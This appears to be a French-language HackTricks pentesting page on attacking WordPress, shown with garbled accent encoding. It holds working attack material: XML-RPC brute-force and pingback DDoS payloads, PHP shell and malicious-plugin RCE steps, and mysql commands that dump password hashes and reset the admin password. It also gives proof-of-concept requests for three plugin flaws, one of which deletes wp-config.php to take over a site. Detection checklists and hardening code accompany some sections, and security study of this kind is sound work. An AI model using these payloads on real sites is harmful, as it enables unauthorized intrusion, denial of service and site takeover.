# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Informations de base

- **Uploaded** files go to: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** donc si vous modifiez un php du th√®me pour obtenir RCE vous utiliserez probablement ce chemin. Par exemple : en utilisant **theme twentytwelve** vous pouvez **access** the **404.php** file in: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- Dans **wp-config.php** vous pouvez trouver le mot de passe root de la base de donn√©es.
- Chemins de connexion par d√©faut √† v√©rifier : _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Fichiers principaux de WordPress**

- `index.php`
- `license.txt` contient des informations utiles telles que la version de WordPress install√©e.
- `wp-activate.php` est utilis√© pour le processus d'activation par email lors de la cr√©ation d'un nouveau site WordPress.
- Dossiers de connexion (peuvent √™tre renomm√©s pour les cacher) :
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` est un fichier repr√©sentant une fonctionnalit√© de WordPress qui permet de transmettre des donn√©es en utilisant HTTP comme m√©canisme de transport et XML comme m√©canisme d'encodage. Ce type de communication a √©t√© remplac√© par la WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
- Le dossier `wp-content` est le r√©pertoire principal o√π les plugins et th√®mes sont stock√©s.
- `wp-content/uploads/` est le r√©pertoire o√π tous les fichiers t√©l√©vers√©s sur la plateforme sont stock√©s.
- `wp-includes/` est le r√©pertoire o√π les fichiers core sont stock√©s, tels que les certificats, polices, fichiers JavaScript et widgets.
- `wp-sitemap.xml` Dans les versions de WordPress 5.5 et sup√©rieures, WordPress g√©n√®re un fichier sitemap XML avec tous les posts publics et les types de post et taxonomies publiquement interrogeables.

**Post-exploitation**

- Le fichier `wp-config.php` contient les informations n√©cessaires √† WordPress pour se connecter √† la base de donn√©es comme le nom de la base de donn√©es, l'h√¥te, le nom d'utilisateur et le mot de passe, les cl√©s d'authentification et salts, et le pr√©fixe des tables de la base de donn√©es. Ce fichier de configuration peut aussi servir √† activer le mode DEBUG, utile pour le d√©pannage.

### Permissions des utilisateurs

- **Administrator**
- **Editor** : Publie et g√®re ses articles et ceux des autres
- **Author** : Publie et g√®re ses propres articles
- **Contributor** : √âcrit et g√®re ses articles mais ne peut pas les publier
- **Subscriber** : Consulte les articles et peut modifier son profil

## **√ânum√©ration passive**

### **Obtenir la version de WordPress**

V√©rifiez la pr√©sence des fichiers `/license.txt` ou `/readme.html`

Dans le **code source** de la page (exemple depuis [https://wordpress.org/support/article/pages/]):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- fichiers link CSS

![](<../../images/image (533).png>)

- fichiers JavaScript

![](<../../images/image (524).png>)

### Obtenir des Plugins
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Obtenir les th√®mes
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Extraire les versions en g√©n√©ral
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## √ânum√©ration active

### Plugins and Themes

Vous ne pourrez probablement pas trouver tous les Plugins and Themes possibles. Pour les d√©couvrir tous, vous devrez **Brute Force activement une liste de Plugins and Themes** (heureusement pour nous, il existe des outils automatis√©s qui contiennent ces listes).

### Utilisateurs

- **ID Brute:** Vous obtenez des utilisateurs valides d'un site WordPress en Brute Forcing les IDs des utilisateurs :
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
Si les r√©ponses sont **200** ou **30X**, cela signifie que l'id est **valide**. Si la r√©ponse est **400**, alors l'id est **invalide**.

- **wp-json:** Vous pouvez aussi essayer d'obtenir des informations sur les utilisateurs en interrogeant :
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
Un autre endpoint `/wp-json/` qui peut r√©v√©ler certaines informations sur les utilisateurs est :
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Notez que cet endpoint n'expose que les utilisateurs qui ont publi√© un post. **Seules les informations concernant les utilisateurs ayant cette fonctionnalit√© activ√©e seront fournies**.

Notez aussi que **/wp-json/wp/v2/pages** pourrait divulguer des adresses IP.

- **Login username enumeration** : Lorsque vous vous connectez via **`/wp-login.php`**, le **message** est **diff√©rent** selon qu'il indique si le **username** existe ou non.

### XML-RPC

Si `xml-rpc.php` est actif, vous pouvez effectuer un brute-force de credentials ou l'utiliser pour lancer des attaques DoS contre d'autres ressources. (Vous pouvez automatiser ce processus [en utilisant ceci](https://github.com/relarizky/wpxploit), par exemple).

Pour v√©rifier s'il est actif, essayez d'acc√©der √† _**/xmlrpc.php**_ et envoyez cette requ√™te :

**V√©rifier**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Bruteforce d'identifiants**

**`wp.getUserBlogs`**, **`wp.getCategories`** or **`metaWeblog.getUsersBlogs`** sont quelques-unes des m√©thodes qui peuvent √™tre utilis√©es pour brute-force des identifiants. Si vous en trouvez une, vous pouvez envoyer quelque chose comme :
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
Le message _"Incorrect username or password"_ dans une r√©ponse avec le code 200 doit appara√Ætre si les credentials ne sont pas valides.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

En utilisant les credentials corrects vous pouvez upload un fichier. Dans la r√©ponse, le path appara√Ætra ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Il existe aussi une fa√ßon **plus rapide** de brute-forcer des identifiants en utilisant **`system.multicall`**, car vous pouvez essayer plusieurs identifiants dans la m√™me requ√™te :

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Contourner la 2FA**

Cette m√©thode est destin√©e aux programmes et non aux humains, et est ancienne, donc elle ne prend pas en charge la 2FA. Ainsi, si vous avez des identifiants valides mais que l'acc√®s principal est prot√©g√© par la 2FA, **vous pourriez √™tre capable d'abuser de xmlrpc.php pour vous connecter avec ces identifiants en contournant la 2FA**. Notez que vous ne pourrez pas effectuer toutes les actions r√©alisables via la console, mais vous pourriez quand m√™me parvenir √† une RCE comme l'explique Ippsec dans [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS or port scanning**

If you can find the method _**pingback.ping**_ inside the list you can make the Wordpress send an arbitrary request to any host/port.\
This can be used to ask **thousands** of Wordpress **sites** to **access** one **location** (so a **DDoS** is caused in that location) or you can use it to make **Wordpress** scan some internal **network** (you can indicate any port).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

Si vous obtenez **faultCode** avec une valeur **sup√©rieure** √† **0** (17), cela signifie que le port est ouvert.

Jetez un ≈ìil √† l'utilisation de **`system.multicall`** dans la section pr√©c√©dente pour apprendre comment abuser de cette m√©thode afin de provoquer un DDoS.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Ce fichier existe g√©n√©ralement √† la racine du site Wordpress : **`/wp-cron.php`**\
Lorsque ce fichier est **acc√©d√©**, une requ√™te MySQL "**lourde**" est ex√©cut√©e, il peut donc √™tre utilis√© par des **attaquants** pour **causer** un **DoS**.\
De plus, par d√©faut, `wp-cron.php` est appel√© √† chaque chargement de page (√† chaque fois qu'un client demande une page Wordpress), ce qui sur des sites √† fort trafic peut causer des probl√®mes (DoS).

Il est recommand√© de d√©sactiver Wp-Cron et de cr√©er un vrai cronjob sur l'h√¥te qui ex√©cute les actions n√©cessaires √† intervalles r√©guliers (sans causer de probl√®mes).

### /wp-json/oembed/1.0/proxy - SSRF

Essayez d'acc√©der √† _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ et le site Wordpress peut effectuer une requ√™te vers vous.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Cet outil v√©rifie la pr√©sence du **methodName: pingback.ping** et du chemin **/wp-json/oembed/1.0/proxy** ; s'ils existent, il tente de les exploiter.

## Outils automatiques
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Obtenir l'acc√®s en modifiant un bit

Plus qu'une v√©ritable attaque, c'est une curiosit√©. Dans le CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) vous pouviez inverser 1 bit d'un fichier wordpress quelconque. Ainsi, vous pouviez inverser la position `5389` du fichier `/var/www/html/wp-includes/user.php` pour rendre NOP l'op√©ration NOT (`!`).
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**Modification d'un php du th√®me utilis√© (identifiants admin requis)**

Appearance ‚Üí Theme Editor ‚Üí 404 Template (√† droite)

Remplacez le contenu par un shell php :

![](<../../images/image (384).png>)

Recherchez sur internet comment acc√©der √† cette page mise √† jour. Dans ce cas, vous devez acc√©der ici: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Vous pouvez utiliser:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
pour obtenir une session.

## Plugin RCE

### PHP plugin

Il peut √™tre possible de t√©l√©verser des fichiers .php en tant que plugin.\
Cr√©ez votre php backdoor en utilisant par exemple :

![](<../../images/image (183).png>)

Then add a new plugin:

![](<../../images/image (722).png>)

T√©l√©versez le plugin et cliquez sur Install Now:

![](<../../images/image (249).png>)

Click on Procced:

![](<../../images/image (70).png>)

Probablement cela n'affichera rien apparemment, mais si vous allez dans Media, vous verrez votre shell t√©l√©vers√© :

![](<../../images/image (462).png>)

Acc√©dez-y et vous verrez l'URL pour ex√©cuter le reverse shell :

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

This method involves the installation of a malicious plugin known to be vulnerable and can be exploited to obtain a web shell. This process is carried out through the WordPress dashboard as follows:

1. **Plugin Acquisition**: Le plugin est obtenu depuis une source comme Exploit DB, par exemple [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- Allez dans le WordPress dashboard, puis dans `Dashboard > Plugins > Upload Plugin`.
- Upload the zip file of the downloaded plugin.
3. **Plugin Activation**: Une fois le plugin install√© avec succ√®s, il doit √™tre activ√© via le dashboard.
4. **Exploitation**:
- Avec le plugin "reflex-gallery" install√© et activ√©, il peut √™tre exploit√© car il est connu pour √™tre vuln√©rable.
- Le framework Metasploit fournit un exploit pour cette vuln√©rabilit√©. En chargeant le module appropri√© et en ex√©cutant des commandes sp√©cifiques, une session meterpreter peut √™tre √©tablie, offrant un acc√®s non autoris√© au site.
- Il est √† noter que ceci n'est qu'une des nombreuses m√©thodes pour exploiter un site WordPress.

Le contenu inclut des aides visuelles montrant les √©tapes dans le WordPress dashboard pour installer et activer le plugin. Cependant, il est important de noter que l'exploitation de vuln√©rabilit√©s de cette mani√®re est ill√©gale et contraire √† l'√©thique sans autorisation appropri√©e. Ces informations doivent √™tre utilis√©es de mani√®re responsable et uniquement dans un contexte l√©gal, comme le penetration testing avec autorisation explicite.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ est un script con√ßu pour escalader une vuln√©rabilit√© de **Cross-Site Scripting (XSS)** en **Remote Code Execution (RCE)** ou d'autres vuln√©rabilit√©s critiques dans WordPress. Pour plus d'infos, voir [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). Il fournit **support pour Wordpress Versions 6.X.X, 5.X.X and 4.X.X. and allows to:**
- _**Privilege Escalation:**_ Cr√©e un utilisateur dans WordPress.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ Uploader votre custom plugin (backdoor) sur WordPress.
- _**(RCE) Built-In Plugin Edit:**_ Modifier un Built-In Plugin dans WordPress.
- _**(RCE) Built-In Theme Edit:**_ Modifier un Built-In Theme dans WordPress.
- _**(Custom) Custom Exploits:**_ Custom Exploits pour des Third-Party WordPress Plugins/Themes.

## Post Exploitation

Extraire les usernames et passwords :
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Changer le mot de passe admin :
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Surface d'attaque

Comprendre comment un plugin Wordpress peut exposer des fonctionnalit√©s est essentiel pour trouver des vuln√©rabilit√©s dans son fonctionnement. Vous pouvez voir comment un plugin peut exposer des fonctionnalit√©s dans les points suivants et quelques exemples de plugins vuln√©rables dans [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

Une des fa√ßons dont un plugin peut exposer des fonctions aux utilisateurs est via des gestionnaires AJAX. Ceux-ci peuvent contenir des failles de logique, d'autorisation ou d'authentification. De plus, il est assez fr√©quent que ces fonctions reposent √† la fois l'authentification et l'autorisation sur l'existence d'un wordpress nonce que **tout utilisateur authentifi√© dans l'instance Wordpress peut poss√©der** (ind√©pendamment de son r√¥le).

Voici les fonctions qui peuvent √™tre utilis√©es pour exposer une fonctionnalit√© dans un plugin :
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**L'utilisation de `nopriv` rend l'endpoint accessible par n'importe quel utilisateur (m√™me les utilisateurs non authentifi√©s).**

> [!CAUTION]
> De plus, si la fonction se contente de v√©rifier l'autorisation de l'utilisateur avec la fonction `wp_verify_nonce`, cette derni√®re v√©rifie uniquement que l'utilisateur est connect√©, elle ne v√©rifie g√©n√©ralement pas le r√¥le de l'utilisateur. Ainsi, des utilisateurs √† faible privil√®ge pourraient avoir acc√®s √† des actions √† privil√®ges √©lev√©s.

- **REST API**

Il est √©galement possible d'exposer des fonctions de wordpress en enregistrant une REST API √† l'aide de la fonction `register_rest_route` :
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback` est une fonction de rappel qui v√©rifie si un utilisateur donn√© est autoris√© √† appeler la m√©thode API.

**Si la fonction int√©gr√©e `__return_true` est utilis√©e, elle contournera simplement la v√©rification des permissions utilisateur.**

- **Acc√®s direct au fichier php**

Bien s√ªr, Wordpress utilise PHP et les fichiers √† l'int√©rieur des plugins sont directement accessibles depuis le web. Donc, si un plugin expose une fonctionnalit√© vuln√©rable qui est d√©clench√©e simplement en acc√©dant au fichier, elle sera exploitable par n'importe quel utilisateur.

### Trusted-header REST impersonation (WooCommerce Payments ‚â§ 5.6.1)

Certains plugins impl√©mentent des raccourcis de ‚Äútrusted header‚Äù pour des int√©grations internes ou des reverse proxies, puis utilisent cet en-t√™te pour d√©finir le contexte utilisateur courant pour les requ√™tes REST. Si l'en-t√™te n'est pas li√© cryptographiquement √† la requ√™te par un composant en amont, un attaquant peut le falsifier et appeler des routes REST privil√©gi√©es en tant qu'administrateur.

- Impact : escalation de privil√®ges non authentifi√©e vers administrateur en cr√©ant un nouvel administrateur via la route core users REST.
- Exemple d'en-t√™te : `X-Wcpay-Platform-Checkout-User: 1` (force l'ID utilisateur 1, typiquement le premier compte administrateur).
- Route exploit√©e : `POST /wp-json/wp/v2/users` avec un tableau de r√¥le √©lev√©.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Pourquoi √ßa fonctionne

- Le plugin mappe un header contr√¥l√© par le client √† l'√©tat d'authentification et esquive les v√©rifications de capability.
- WordPress core attend la capability `create_users` pour cette route ; le contournement du plugin l'√©vite en d√©finissant directement le contexte de l'utilisateur courant depuis le header.

Indicateurs de r√©ussite attendus

- HTTP 201 avec un body JSON d√©crivant l'utilisateur cr√©√©.
- Un nouvel utilisateur admin visible dans `wp-admin/users.php`.

Checklist de d√©tection

- Grep pour `getallheaders()`, `$_SERVER['HTTP_...']`, ou des SDK tiers qui lisent des headers personnalis√©s pour d√©finir le contexte utilisateur (par ex. `wp_set_current_user()`, `wp_set_auth_cookie()`).
- Revoir les enregistrements REST pour des callbacks privil√©gi√©s qui n'ont pas de `permission_callback` robuste et qui s'appuient √† la place sur les headers de la requ√™te.
- Chercher des usages des fonctions core de gestion d'utilisateurs (`wp_insert_user`, `wp_create_user`) √† l'int√©rieur de handlers REST qui sont prot√©g√©s uniquement par des valeurs de header.

Durcissement

- Ne jamais d√©duire l'authentification ou l'autorisation √† partir de headers contr√¥l√©s par le client.
- Si un reverse proxy doit injecter une identit√©, terminer la confiance au niveau du proxy et supprimer les copies entrantes (par ex. `unset X-Wcpay-Platform-Checkout-User` en bordure), puis transmettre un token sign√© et le v√©rifier c√¥t√© serveur.
- Pour les routes REST effectuant des actions privil√©gi√©es, exiger des v√©rifications `current_user_can()` et un `permission_callback` strict (ne PAS utiliser `__return_true`).
- Pr√©f√©rer une auth first-party (cookies, application passwords, OAuth) plut√¥t que l‚Äô¬´ impersonation ¬ª via headers.

R√©f√©rences : voir les liens √† la fin de cette page pour un cas public et une analyse plus large.

### Suppression arbitraire de fichiers sans authentification via wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress themes and plugins frequently expose AJAX handlers through the `wp_ajax_` and `wp_ajax_nopriv_` hooks.  When the **_nopriv_** variant is used **the callback becomes reachable by unauthenticated visitors**, so any sensitive action must additionally implement:

1. A **capability check** (e.g. `current_user_can()` or at least `is_user_logged_in()`), and
2. A **CSRF nonce** validated with `check_ajax_referer()` / `wp_verify_nonce()`, and
3. **Strict input sanitisation / validation**.

Le Litho multipurpose theme (< 3.1) a oubli√© ces 3 contr√¥les dans la fonctionnalit√© *Remove Font Family* et a fini par livrer le code suivant (simplifi√©) :
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Issues introduced by this snippet:

* **Acc√®s non authentifi√©** ‚Äì le hook `wp_ajax_nopriv_` est enregistr√©.
* **Pas de v√©rification de nonce / capability** ‚Äì n'importe quel visiteur peut atteindre l'endpoint.
* **Pas de sanitisation du chemin** ‚Äì la cha√Æne contr√¥l√©e par l'utilisateur `fontfamily` est concat√©n√©e √† un chemin du syst√®me de fichiers sans filtrage, permettant le classique parcours `../../`.

#### Exploitation

Un attaquant peut supprimer n'importe quel fichier ou r√©pertoire **sous le r√©pertoire de base uploads** (normalement `<wp-root>/wp-content/uploads/`) en envoyant une seule HTTP POST request:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Parce que `wp-config.php` se trouve en dehors du r√©pertoire *uploads*, quatre s√©quences `../` suffisent sur une installation par d√©faut. La suppression de `wp-config.php` force WordPress √† lancer le *assistant d'installation* lors de la visite suivante, permettant une prise de contr√¥le compl√®te du site (l'attaquant fournit simplement une nouvelle configuration DB et cr√©e un utilisateur admin).

D'autres cibles ayant un fort impact incluent les fichiers `.php` de plugin/theme (pour neutraliser les plugins de s√©curit√©) ou les r√®gles `.htaccess`.

#### Checklist de d√©tection

* Tout callback `add_action( 'wp_ajax_nopriv_...')` qui appelle des helpers syst√®me de fichiers (`copy()`, `unlink()`, `$wp_filesystem->delete()`, etc.).
* Concatenation d'entr√©es utilisateur non assainies dans des chemins (chercher `$_POST`, `$_GET`, `$_REQUEST`).
* Absence de `check_ajax_referer()` et de `current_user_can()`/`is_user_logged_in()`.

#### Durcissement
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// ‚Ä¶ proceed ‚Ä¶
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  üîí  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **Toujours** consid√©rer toute op√©ration d'√©criture/suppression sur le disque comme privil√©gi√©e et v√©rifier √† nouveau :
> ‚Ä¢ Authentication  ‚Ä¢ Authorisation  ‚Ä¢ Nonce  ‚Ä¢ Input sanitisation  ‚Ä¢ Path containment (e.g. via `realpath()` plus `str_starts_with()`).

---

### Privilege escalation via stale role restoration and missing authorization (ASE "View Admin as Role")

De nombreux plugins impl√©mentent une fonctionnalit√© "view as role" ou un changement temporaire de r√¥le en sauvegardant le(s) r√¥le(s) original(aux) dans user meta afin de pouvoir les restaurer plus tard. Si le chemin de restauration ne s'appuie que sur des param√®tres de requ√™te (par ex., `$_REQUEST['reset-for']`) et une liste maintenue par le plugin sans v√©rifier les capabilities et un nonce valide, cela devient une vertical privilege escalation.

Un exemple r√©el a √©t√© trouv√© dans le plugin Admin and Site Enhancements (ASE) (‚â§ 7.6.2.1). La branche de reset restaurait les r√¥les bas√©e sur `reset-for=<username>` si le nom d'utilisateur apparaissait dans un tableau interne `$options['viewing_admin_as_role_are']`, mais n'effectuait ni un contr√¥le `current_user_can()` ni une v√©rification du nonce avant de supprimer les r√¥les actuels et de r√©-ajouter les r√¥les sauvegard√©s dans le user meta `_asenha_view_admin_as_original_roles` :
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Pourquoi c'est exploitable

- Fait confiance √† `$_REQUEST['reset-for']` et √† une option du plugin sans autorisation c√¥t√© serveur.
- Si un utilisateur avait auparavant des privil√®ges plus √©lev√©s sauvegard√©s dans `_asenha_view_admin_as_original_roles` et a √©t√© r√©trograd√©, il peut les restaurer en acc√©dant au reset path.
- Dans certaines configurations, tout utilisateur authentifi√© peut d√©clencher un reset pour un autre nom d'utilisateur encore pr√©sent dans `viewing_admin_as_role_are` (autorisation cass√©e).

Pr√©requis de l'attaque

- Version vuln√©rable du plugin avec la fonctionnalit√© activ√©e.
- Le compte cible a un r√¥le √† privil√®ges √©lev√©s obsol√®te stock√© dans user meta depuis une utilisation ant√©rieure.
- N'importe quelle session authentifi√©e ; absence de nonce/capability dans le reset flow.

Exploitation (exemple)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
Sur les versions vuln√©rables, cela supprime les r√¥les actuels et r√©ajoute les r√¥les originaux sauvegard√©s (par ex., `administrator`), escaladant ainsi les privil√®ges.

Detection checklist

- Recherchez des fonctionnalit√©s de changement de r√¥le qui conservent ‚Äúoriginal roles‚Äù dans les user meta (e.g., `_asenha_view_admin_as_original_roles`).
- Identifiez les chemins de reset/restore qui :
- Lisent les noms d'utilisateur depuis `$_REQUEST` / `$_GET` / `$_POST`.
- Modifient les r√¥les via `add_role()` / `remove_role()` sans `current_user_can()` et `wp_verify_nonce()` / `check_admin_referer()`.
- Autorisent en se basant sur un tableau d'options du plugin (e.g., `viewing_admin_as_role_are`) au lieu des capacit√©s de l'acteur.

Durcissement

- Appliquez des v√©rifications de capacit√©s sur chaque branche modifiant l'√©tat (e.g., `current_user_can('manage_options')` ou plus strict).
- Exigez des nonces pour toutes les mutations de r√¥le/permission et v√©rifiez-les : `check_admin_referer()` / `wp_verify_nonce()`.
- Ne faites jamais confiance aux noms d'utilisateur fournis dans la requ√™te ; r√©solvez l'utilisateur cible c√¥t√© serveur en fonction de l'acteur authentifi√© et d'une politique explicite.
- Invalidez l'√©tat des ‚Äúoriginal roles‚Äù lors des mises √† jour de profil/role pour √©viter la restauration de privil√®ges √©lev√©s obsol√®tes :
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
- Envisagez de stocker un √©tat minimal et d'utiliser des tokens limit√©s dans le temps et prot√©g√©s par des capabilities pour des changements de r√¥le temporaires.

---

### Consid√©rations WAF pour WordPress/plugin CVEs

Les WAFs g√©n√©riques edge/serveur sont r√©gl√©s pour des motifs larges (SQLi, XSS, LFI). Beaucoup de failles WordPress/plugin √† fort impact sont des bugs de logique applicative/auth qui ressemblent √† du trafic b√©nin √† moins que le moteur ne comprenne les routes WordPress et la s√©mantique des plugins.

Notes offensives

- Ciblez les endpoints sp√©cifiques aux plugins avec des payloads propres : `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Testez d'abord les chemins unauth (AJAX `nopriv`, REST avec `permission_callback` permissif, shortcodes publics). Les payloads par d√©faut r√©ussissent souvent sans obfuscation.
- Cas typiques √† fort impact : escalade de privil√®ges (broken access control), upload/download de fichiers arbitraires, LFI, open redirect.

Notes d√©fensives

- Ne comptez pas sur des signatures WAF g√©n√©riques pour prot√©ger les plugin CVEs. Impl√©mentez des virtual patches sp√©cifiques aux vuln√©rabilit√©s au niveau applicatif ou mettez √† jour rapidement.
- Privil√©giez des contr√¥les de s√©curit√© en mode positif dans le code (capabilities, nonces, strict input validation) plut√¥t que des filtres regex n√©gatifs.

## Protection WordPress

### Mises √† jour r√©guli√®res

Assurez-vous que WordPress, les plugins et les th√®mes sont √† jour. V√©rifiez aussi que la mise √† jour automatique est activ√©e dans wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Aussi, **n'installez que des plugins et th√®mes WordPress de confiance**.

### Plugins de s√©curit√©

